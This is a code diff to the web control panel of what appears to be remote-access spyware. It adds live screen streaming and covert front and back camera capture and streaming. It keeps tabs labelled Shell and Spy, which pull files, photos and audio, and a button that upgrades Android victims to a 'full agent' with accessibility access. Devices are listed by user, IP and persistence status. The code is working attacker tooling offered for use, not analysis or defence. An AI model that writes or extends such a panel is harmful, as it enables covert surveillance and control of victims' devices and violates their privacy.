@@ -408,82 +408,148 @@ select:focus { outline: none; border-color: var(--green); }
 .screen-box .screen-spinner[hidden] { display: none; }
 
 /* ── device cards ── */
-.device-list { display: flex; flex-direction: column; gap: 8px; }
+.device-list { display: flex; flex-direction: column; gap: 6px; }
 
 .device-card {
   background: var(--bg2);
   border: 1px solid var(--border);
-  border-radius: 6px;
-  padding: 12px 14px;
+  border-radius: 8px;
+  padding: 14px 16px;
   cursor: pointer;
-  transition: border-color .15s;
+  transition: border-color .15s, background .15s, box-shadow .15s;
   display: flex;
   align-items: center;
-  gap: 12px;
-  flex-wrap: wrap;
+  gap: 14px;
 }
-.device-card:hover { border-color: var(--green); }
-.device-card.selected { border-color: var(--green); background: var(--bg3); }
-.device-card.offline { opacity: .55; }
+.device-card:hover {
+  border-color: var(--green);
+  background: var(--bg3);
+  box-shadow: 0 0 0 1px rgba(0,230,118,.12), 0 4px 16px rgba(0,0,0,.35);
+}
+.device-card.selected {
+  border-color: var(--green);
+  background: var(--bg3);
+  box-shadow: 0 0 0 1px var(--green), 0 4px 20px rgba(0,230,118,.08);
+}
+.device-card.offline { opacity: .5; }
 
 .device-dot {
-  width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0;
-  background: var(--red); box-shadow: 0 0 5px var(--red);
+  width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0;
+  background: var(--red); box-shadow: 0 0 6px var(--red);
+  transition: background .3s, box-shadow .3s;
 }
-.device-dot.on { background: var(--green); box-shadow: 0 0 8px var(--green); }
+.device-dot.on { background: var(--green); box-shadow: 0 0 10px var(--green); }
 
+.device-os-icon { font-size: 1.4em; flex-shrink: 0; line-height: 1; }
 .device-info { flex: 1; min-width: 0; }
-.device-host { font-weight: 700; font-size: .88em; color: var(--fg); }
-.device-meta { font-size: .72em; color: var(--fg2); margin-top: 2px; }
-
-.device-actions { display: flex; gap: 6px; flex-shrink: 0; }
+.device-host { font-weight: 700; font-size: .9em; color: var(--fg); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.device-meta { font-size: .71em; color: var(--fg2); margin-top: 3px; display: flex; gap: 8px; flex-wrap: wrap; }
+.device-meta span { display: flex; align-items: center; gap: 3px; }
+.device-badge {
+  display: inline-block; padding: 1px 7px; border-radius: 8px; font-size: .68em;
+  font-weight: 600; letter-spacing: .03em; background: rgba(0,230,118,.12);
+  color: var(--green); border: 1px solid rgba(0,230,118,.25);
+}
+.device-actions { display: flex; gap: 6px; flex-shrink: 0; align-items: center; }
 
 /* ── device control panel ── */
 .dev-panel {
   background: var(--bg2);
-  border: 1px solid var(--green);
-  border-radius: 6px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
   margin-top: 12px;
+  overflow: hidden;
+  box-shadow: 0 4px 24px rgba(0,0,0,.4);
 }
 .dev-panel-header {
   display: flex;
   align-items: center;
-  gap: 10px;
-  padding: 10px 14px;
+  gap: 12px;
+  padding: 12px 16px;
+  background: var(--bg3);
   border-bottom: 1px solid var(--border);
   flex-wrap: wrap;
 }
-.dev-tabs { display: flex; gap: 4px; padding: 10px 14px 0; }
-.dev-tab {
-  padding: 6px 14px; border-radius: 4px 4px 0 0; font-size: .8em;
-  cursor: pointer; border: 1px solid var(--border); border-bottom: none;
-  background: var(--bg3); color: var(--fg2); transition: background .1s;
+.dev-panel-title { flex: 1; min-width: 0; }
+.dev-panel-title h3 { font-size: .9em; font-weight: 700; color: var(--fg); margin: 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.dev-panel-title p  { font-size: .7em; color: var(--fg2); margin: 2px 0 0; }
+
+.dev-tabs {
+  display: flex; gap: 0; padding: 0;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg3);
+  overflow-x: auto;
+  scrollbar-width: none;
 }
-.dev-tab.active { background: var(--bg2); color: var(--green); border-color: var(--green); }
-.dev-tab-body { padding: 12px 14px; }
+.dev-tabs::-webkit-scrollbar { display: none; }
+.dev-tab {
+  padding: 10px 16px; font-size: .78em; font-weight: 600; letter-spacing: .03em;
+  cursor: pointer; border-right: 1px solid var(--border); white-space: nowrap;
+  color: var(--fg2); transition: color .15s, background .15s;
+  border-bottom: 2px solid transparent; margin-bottom: -1px;
+}
+.dev-tab:hover { color: var(--fg); background: var(--bg2); }
+.dev-tab.active { color: var(--green); background: var(--bg2); border-bottom-color: var(--green); }
+.dev-tab-body { padding: 14px 16px; }
 
 /* ── drop agent dropdown ── */
 .drop-wrap { position: relative; display: inline-block; }
 .drop-menu {
   display: none; position: absolute; right: 0; top: 100%; margin-top: 4px;
-  background: var(--bg3); border: 1px solid var(--green); border-radius: 4px;
-  z-index: 100; min-width: 200px;
+  background: var(--bg3); border: 1px solid var(--green); border-radius: 6px;
+  z-index: 100; min-width: 220px;
+  box-shadow: 0 8px 24px rgba(0,0,0,.5);
 }
 .drop-menu.open { display: block; }
 .drop-item {
-  padding: 9px 14px; cursor: pointer; font-size: .82em; color: var(--fg);
+  padding: 10px 16px; cursor: pointer; font-size: .82em; color: var(--fg);
   transition: background .1s;
 }
-.drop-item:hover { background: var(--bg2); color: var(--green); }
+.drop-item:first-child { border-radius: 6px 6px 0 0; }
+.drop-item:last-child  { border-radius: 0 0 6px 6px; }
+.drop-item:hover { background: rgba(0,230,118,.1); color: var(--green); }
 
-/* ── device screen box ── */
+/* ── device screen ── */
 .dev-screen {
-  background: #000; border-radius: 4px; overflow: hidden;
-  min-height: 180px; display: flex; align-items: center; justify-content: center;
-  position: relative;
+  background: #000; border-radius: 6px; overflow: hidden;
+  position: relative; line-height: 0;
 }
-.dev-screen img { width: 100%; display: block; }
-.dev-screen-empty { color: var(--fg2); font-size: .8em; padding: 24px; text-align: center; }
+.dev-screen img {
+  width: 100%; display: block;
+  transition: opacity .12s ease;
+}
+.dev-screen img.flash { opacity: .7; }
+.dev-screen-empty {
+  color: var(--fg2); font-size: .8em; padding: 48px 24px;
+  text-align: center; line-height: 1.7; background: #000;
+}
+.screen-toolbar {
+  display: flex; gap: 6px; margin-bottom: 10px;
+  align-items: center; flex-wrap: wrap;
+}
+.screen-statusbar {
+  display: flex; justify-content: space-between; align-items: center;
+  margin-top: 6px; font-size: .69em; color: var(--fg2);
+}
+.live-badge {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 2px 8px; border-radius: 10px;
+  font-size: .72em; font-weight: 600;
+  background: rgba(255,82,82,.15); color: var(--red);
+  border: 1px solid rgba(255,82,82,.3);
+}
+.live-badge.on { background: rgba(0,230,118,.15); color: var(--green); border-color: rgba(0,230,118,.35); }
+.live-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
+.live-dot.pulse { animation: livepulse 1s ease-in-out infinite; }
+@keyframes livepulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+/* ── cam live panel ── */
+.cam-live-screen {
+  background: #000; border-radius: 6px; overflow: hidden;
+  margin-top: 8px; line-height: 0; position: relative;
+}
+.cam-live-screen img { width: 100%; display: block; }
+.cam-live-empty { color: var(--fg2); font-size: .8em; padding: 40px 24px; text-align: center; background: #000; border-radius: 6px; }
 </style>
 </head>
 <body>
@@ -996,35 +1062,60 @@ select:focus { outline: none; border-color: var(--green); }
   <!-- Per-device control panel (shown when a device is selected) -->
   <div class="dev-panel" id="devPanel" style="display:none;">
     <div class="dev-panel-header">
-      <button class="btn" onclick="closeDevPanel()" style="font-size:.78em;padding:5px 10px;">← Back</button>
-      <div style="flex:1;">
-        <div style="font-weight:700;font-size:.9em;color:var(--fg);" id="dpHostname"></div>
-        <div style="font-size:.72em;color:var(--fg2);margin-top:2px;" id="dpMeta"></div>
+      <button class="btn" onclick="closeDevPanel()" style="font-size:.78em;padding:5px 10px;flex-shrink:0;">← Back</button>
+      <div class="dev-panel-title">
+        <h3 id="dpHostname">—</h3>
+        <p id="dpMeta"></p>
       </div>
-      <button class="btn" onclick="uninstallDevice()" style="border-color:var(--red);color:var(--red);font-size:.78em;padding:5px 10px;">
-        ✕ Uninstall
-      </button>
+      <div style="display:flex;gap:6px;flex-shrink:0;">
+        <span id="dpFullBadge" style="display:none;" class="device-badge">FULL</span>
+        <span id="dpOnlineBadge" class="live-badge" style="display:none;">
+          <span class="live-dot pulse"></span> LIVE
+        </span>
+        <button class="btn" onclick="uninstallDevice()" style="border-color:var(--red);color:var(--red);font-size:.78em;padding:5px 10px;">✕ Remove</button>
+      </div>
     </div>
 
     <div class="dev-tabs">
-      <div class="dev-tab active" id="dtab-screen" onclick="switchDevTab('screen')">Screen</div>
-      <div class="dev-tab" id="dtab-shell" onclick="switchDevTab('shell')">Shell</div>
-      <div class="dev-tab" id="dtab-spy" onclick="switchDevTab('spy')">Spy</div>
-      <div class="dev-tab" id="dtab-info" onclick="switchDevTab('info')">Info</div>
+      <div class="dev-tab active" id="dtab-screen" onclick="switchDevTab('screen')">📺 Screen</div>
+      <div class="dev-tab" id="dtab-cam" onclick="switchDevTab('cam')">📷 Camera</div>
+      <div class="dev-tab" id="dtab-shell" onclick="switchDevTab('shell')">$ Shell</div>
+      <div class="dev-tab" id="dtab-spy" onclick="switchDevTab('spy')">🕵 Spy</div>
+      <div class="dev-tab" id="dtab-info" onclick="switchDevTab('info')">ℹ Info</div>
     </div>
 
     <!-- Screen sub-tab -->
     <div class="dev-tab-body" id="dtabBody-screen">
-      <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center;flex-wrap:wrap;">
-        <button class="btn btn-primary" onclick="devScreenRefresh()" style="font-size:.78em;padding:5px 12px;">↻ Refresh</button>
-        <button class="btn" id="btnDevLive" onclick="toggleDevLive()" style="font-size:.78em;padding:5px 12px;">▶ Live</button>
-        <span id="devScreenStatus" style="font-size:.72em;color:var(--fg2);"></span>
+      <div class="screen-toolbar">
+        <button class="btn btn-primary" onclick="devScreenRefresh()" style="font-size:.78em;padding:5px 12px;">↻ Snap</button>
+        <button class="btn" id="btnDevLive" onclick="toggleDevLive()" style="font-size:.78em;padding:5px 14px;">▶ Live</button>
+        <span id="devLiveBadge" class="live-badge" style="display:none;"><span class="live-dot pulse"></span> STREAMING</span>
+        <span id="devScreenStatus" style="font-size:.72em;color:var(--fg2);margin-left:4px;"></span>
       </div>
       <div class="dev-screen" id="devScreen">
-        <div class="dev-screen-empty" id="devScreenEmpty">No screenshot yet — click Refresh or wait for Live to start.</div>
-        <img id="devScreenImg" style="display:none;" alt="target screen">
+        <div class="dev-screen-empty" id="devScreenEmpty">No screen data yet — click Snap or ▶ Live</div>
+        <img id="devScreenImg" style="display:none;" alt="screen">
       </div>
-      <div style="font-size:.68em;color:var(--fg2);margin-top:5px;" id="devScreenTs"></div>
+      <div class="screen-statusbar">
+        <span id="devScreenTs"></span>
+        <span id="devScreenFps" style="color:var(--green);"></span>
+      </div>
+    </div>
+
+    <!-- Camera sub-tab -->
+    <div class="dev-tab-body" id="dtabBody-cam" style="display:none;">
+      <div class="screen-toolbar">
+        <button class="btn" onclick="sendCmd2('__cam__')" style="font-size:.78em;padding:5px 12px;">📷 Back Snap</button>
+        <button class="btn" onclick="sendCmd2('__cam_front__')" style="font-size:.78em;padding:5px 12px;">🤳 Front Snap</button>
+        <button class="btn btn-primary" id="btnCamLive" onclick="toggleCamLive(false)" style="font-size:.78em;padding:5px 14px;">▶ Back Live</button>
+        <button class="btn" id="btnCamLiveFront" onclick="toggleCamLive(true)" style="font-size:.78em;padding:5px 14px;">▶ Front Live</button>
+        <span id="camLiveBadge" class="live-badge" style="display:none;"><span class="live-dot pulse"></span> LIVE</span>
+      </div>
+      <div id="camLiveScreen" class="cam-live-empty">Start Live or Snap to see camera feed.</div>
+      <div class="screen-statusbar">
+        <span id="camScreenTs"></span>
+        <span id="camScreenFps" style="color:var(--green);"></span>
+      </div>
     </div>
 
     <!-- Shell sub-tab -->
@@ -1352,19 +1443,29 @@ function renderDeviceList(devices) {
     const os = d.os || '?';
     const isAndroid = os.toLowerCase().includes('android');
     const osIcon = isAndroid ? '🤖' : os.toLowerCase().includes('win') ? '🪟' : os.toLowerCase().includes('mac') ? '🍎' : '🐧';
-    const ago = d.ago < 60 ? d.ago + 's' : Math.round(d.ago/60) + 'm';
+    const ago = d.ago < 60 ? d.ago + 's ago' : Math.round(d.ago/60) + 'm ago';
     const sel = d.id === _selectedDid ? ' selected' : '';
     const off = d.online ? '' : ' offline';
-    const grantBtn = (isAndroid && !d.full) ? `<button class="btn" onclick="event.stopPropagation();grantFullAccess('${escHtml(d.id)}')" style="font-size:.75em;padding:4px 10px;border-color:#f90;color:#f90;" title="Upgrade to full agent + enable accessibility">Grant Full Access</button>` : '';
+    const grantBtn = (isAndroid && !d.full)
+      ? `<button class="btn" onclick="event.stopPropagation();grantFullAccess('${escHtml(d.id)}')" style="font-size:.72em;padding:4px 9px;border-color:#f90;color:#f90;">⬆ Upgrade</button>`
+      : '';
+    const fullBadge = d.full ? `<span class="device-badge" style="font-size:.65em;">FULL</span>` : '';
     return `<div class="device-card${sel}${off}" onclick="selectDevice('${escHtml(d.id)}')">
       <div class="device-dot ${d.online?'on':''}"></div>
+      <div class="device-os-icon">${osIcon}</div>
       <div class="device-info">
-        <div class="device-host">${osIcon} ${escHtml(d.hostname || 'unknown')}</div>
-        <div class="device-meta">${escHtml(os)} · ${escHtml(d.user||'?')} · ${escHtml(d.ip||'?')} · ${ago} ago ${d.persistent?'· persistent':''}</div>
+        <div class="device-host">${escHtml(d.hostname || 'unknown')} ${fullBadge}</div>
+        <div class="device-meta">
+          <span>🖥 ${escHtml(os)}</span>
+          <span>👤 ${escHtml(d.user||'?')}</span>
+          <span>🌐 ${escHtml(d.ip||'?')}</span>
+          <span>⏱ ${ago}</span>
+          ${d.persistent ? '<span>⚡ persistent</span>' : ''}
+        </div>
       </div>
       <div class="device-actions">
         ${grantBtn}
-        <button class="btn" onclick="event.stopPropagation();selectDevice('${escHtml(d.id)}')" style="font-size:.75em;padding:4px 10px;">Control →</button>
+        <button class="btn btn-primary" onclick="event.stopPropagation();selectDevice('${escHtml(d.id)}')" style="font-size:.75em;padding:5px 12px;">Control →</button>
       </div>
     </div>`;
   }).join('');
@@ -1386,10 +1487,14 @@ function selectDevice(did) {
   fetch(RELAY_BASE + '/api/devices').then(r=>r.json()).then(devices => {
     const d = devices.find(x => x.id === did);
     if (!d) return;
+    const os2 = d.os || '?';
+    const osi = os2.toLowerCase().includes('win') ? '🪟' : os2.toLowerCase().includes('mac') ? '🍎' : os2.toLowerCase().includes('android') ? '🤖' : '🐧';
     document.getElementById('dpHostname').textContent = (d.hostname || 'unknown') + (d.persistent ? ' ⚡' : '');
-    const os = d.os || '?';
-    const osIcon = os.toLowerCase().includes('win') ? '🪟' : os.toLowerCase().includes('mac') ? '🍎' : '🐧';
-    document.getElementById('dpMeta').textContent = `${osIcon} ${os} · ${d.user||'?'} · ${d.ip||'?'}`;
+    document.getElementById('dpMeta').textContent = `${osi} ${os2} · ${d.user||'?'} · ${d.ip||'?'}`;
+    const fullBadge = document.getElementById('dpFullBadge');
+    fullBadge.style.display = d.full ? '' : 'none';
+    const onlineBadge = document.getElementById('dpOnlineBadge');
+    onlineBadge.style.display = d.online ? '' : 'none';
     populateQuickCmds(d.os || '');
     switchDevTab('screen');
     devScreenRefresh();
@@ -1399,19 +1504,22 @@ function selectDevice(did) {
 function closeDevPanel() {
   _selectedDid = null;
   stopDevLive();
+  stopCamLive();
   document.getElementById('devPanel').style.display = 'none';
   document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
 }
 
 function switchDevTab(name) {
   _devActiveTab = name;
-  ['screen','shell','spy','info'].forEach(t => {
+  ['screen','cam','shell','spy','info'].forEach(t => {
     document.getElementById('dtab-' + t).classList.toggle('active', t === name);
     document.getElementById('dtabBody-' + t).style.display = t === name ? '' : 'none';
   });
   if (name === 'shell') refreshDevHistory();
   if (name === 'info') loadDevInfo();
   if (name === 'spy') { loadSpyFiles(); loadSpyPhotos(); loadSpyAudio(); }
+  if (name !== 'screen') stopDevLive();
+  if (name !== 'cam') stopCamLive();
 }
 
 async function devScreenRefresh() {
@@ -1437,19 +1545,112 @@ function refreshDevScreen(d) {
   devScreenRefresh();
 }
 
+let _screenEs = null;
+let _screenFps = 0, _screenFpsTick = 0;
+
 function toggleDevLive() {
   if (_devLiveOn) { stopDevLive(); return; }
+  if (!_selectedDid) return;
   _devLiveOn = true;
   document.getElementById('btnDevLive').textContent = '■ Stop';
-  document.getElementById('btnDevLive').style.cssText = 'background:var(--red);border-color:var(--red);color:#fff;font-size:.78em;padding:5px 12px;';
-  _devLiveTimer = setInterval(devScreenRefresh, 2500);
+  document.getElementById('btnDevLive').style.cssText = 'background:var(--red);border-color:var(--red);color:#fff;font-size:.78em;padding:5px 14px;';
+  document.getElementById('devLiveBadge').style.display = '';
+
+  // SSE — frames arrive as base64 data
+  _screenEs = new EventSource(RELAY_BASE + '/api/devices/' + _selectedDid + '/screen-stream');
+  const img = document.getElementById('devScreenImg');
+  const empty = document.getElementById('devScreenEmpty');
+  _screenEs.onmessage = (e) => {
+    if (!e.data || e.data.startsWith(':')) return;
+    img.src = 'data:image/jpeg;base64,' + e.data;
+    img.style.display = '';
+    empty.style.display = 'none';
+    document.getElementById('devScreenTs').textContent = 'Frame at ' + new Date().toLocaleTimeString();
+    img.classList.add('flash');
+    setTimeout(() => img.classList.remove('flash'), 100);
+    _screenFps++;
+  };
+  _screenEs.onerror = () => { document.getElementById('devScreenStatus').textContent = 'Stream error — agent may be offline'; };
+
+  // FPS counter
+  _screenFpsTick = setInterval(() => {
+    document.getElementById('devScreenFps').textContent = _screenFps > 0 ? _screenFps + ' fps' : '';
+    _screenFps = 0;
+  }, 1000);
 }
 
 function stopDevLive() {
   _devLiveOn = false;
+  if (_screenEs) { _screenEs.close(); _screenEs = null; }
+  if (_screenFpsTick) { clearInterval(_screenFpsTick); _screenFpsTick = null; }
   if (_devLiveTimer) { clearInterval(_devLiveTimer); _devLiveTimer = null; }
+  document.getElementById('devScreenFps').textContent = '';
+  const badge = document.getElementById('devLiveBadge');
+  if (badge) badge.style.display = 'none';
   const btn = document.getElementById('btnDevLive');
-  if (btn) { btn.textContent = '▶ Live'; btn.style.cssText = 'font-size:.78em;padding:5px 12px;'; }
+  if (btn) { btn.textContent = '▶ Live'; btn.style.cssText = 'font-size:.78em;padding:5px 14px;'; }
+}
+
+// ── Camera live ───────────────────────────────────────────────────────────────
+
+let _camLiveOn = false, _camEs = null, _camFps = 0, _camFpsTick = null;
+
+function toggleCamLive(front) {
+  if (_camLiveOn) { stopCamLive(); return; }
+  if (!_selectedDid) return;
+  _camLiveOn = true;
+  const cmd = front ? '__cam_live_front__' : '__cam_live_on__';
+  sendCmd2(cmd);  // tell agent to start pushing frames
+
+  const b1 = document.getElementById('btnCamLive');
+  const b2 = document.getElementById('btnCamLiveFront');
+  b1.textContent = front ? '▶ Back Live' : '■ Stop';
+  b2.textContent = front ? '■ Stop' : '▶ Front Live';
+  document.getElementById('camLiveBadge').style.display = '';
+
+  _camEs = new EventSource(RELAY_BASE + '/api/devices/' + _selectedDid + '/cam-stream');
+  _camEs.onmessage = (e) => {
+    if (!e.data || e.data.startsWith(':')) return;
+    let el = document.getElementById('camLiveScreen');
+    if (el.tagName !== 'IMG') {
+      const img2 = document.createElement('img');
+      img2.alt = 'camera';
+      img2.style.cssText = 'width:100%;display:block;border-radius:6px;';
+      el.parentNode.replaceChild(img2, el);
+      img2.id = 'camLiveScreen';
+      el = img2;
+    }
+    el.src = 'data:image/jpeg;base64,' + e.data;
+    document.getElementById('camScreenTs').textContent = 'Frame at ' + new Date().toLocaleTimeString();
+    _camFps++;
+  };
+  _camFpsTick = setInterval(() => {
+    document.getElementById('camScreenFps').textContent = _camFps > 0 ? _camFps + ' fps' : '';
+    _camFps = 0;
+  }, 1000);
+}
+
+function stopCamLive() {
+  if (!_camLiveOn) return;
+  _camLiveOn = false;
+  if (_camEs) { _camEs.close(); _camEs = null; }
+  if (_camFpsTick) { clearInterval(_camFpsTick); _camFpsTick = null; }
+  sendCmd2('__cam_live_off__');
+  document.getElementById('camScreenFps').textContent = '';
+  document.getElementById('camLiveBadge').style.display = 'none';
+  document.getElementById('btnCamLive').textContent = '▶ Back Live';
+  document.getElementById('btnCamLiveFront').textContent = '▶ Front Live';
+}
+
+// helper — send command to currently selected device
+async function sendCmd2(cmd) {
+  if (!_selectedDid) return;
+  try {
+    await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/cmd', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({cmd})
+    });
+  } catch(e) {}
 }
 
 async function sendDevCmd() {
